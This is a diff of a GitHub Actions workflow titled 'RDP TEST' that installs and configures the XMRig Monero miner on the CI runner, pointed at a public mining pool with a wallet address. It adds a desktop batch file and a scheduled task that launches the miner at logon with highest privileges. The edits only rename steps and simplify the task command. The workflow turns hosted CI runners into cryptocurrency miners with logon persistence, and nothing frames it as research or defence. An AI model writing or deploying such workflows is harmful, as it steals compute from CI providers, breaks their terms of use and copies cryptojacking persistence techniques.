@@ -1,4 +1,4 @@
-name: RDP TEST with Visible Admin Auto-Start Miner
+name: RDP TEST with Visible Admin Auto-Start (Final)
 
 on:
   workflow_dispatch:
@@ -44,11 +44,12 @@ jobs:
           $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
 
+          # We add 'pause' back so the window stays open if there's an error on startup
           $batPath = Join-Path $desktopPath "Start-Miner.bat"
           $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe`r`npause"
           Set-Content -Path $batPath -Value $batContent
 
-      - name: Auto-start Miner with Admin Privileges (Visible Window)
+      - name: Auto-start Miner with Admin Privileges (Visible)
         shell: powershell
         run: |
           $ErrorActionPreference = "Stop"
@@ -56,9 +57,8 @@ jobs:
           $batPath = "C:\Users\RDP\Desktop\Start-Miner.bat"
           
           Write-Host "Creating a new Scheduled Task to run the miner visibly..."
-          # This command uses 'start' to launch the batch file in a new, interactive window.
-          $action = "cmd.exe /c start `"Start Miner`" `"$batPath`""
-          schtasks /create /TN $taskName /TR $action /SC ONLOGON /RL HIGHEST /F
+          # This is the simplified, corrected command that will work.
+          schtasks /create /TN $taskName /TR $batPath /SC ONLOGON /RL HIGHEST /F
           
           Write-Host "--- Verification Step ---"
           schtasks /query /TN $taskName
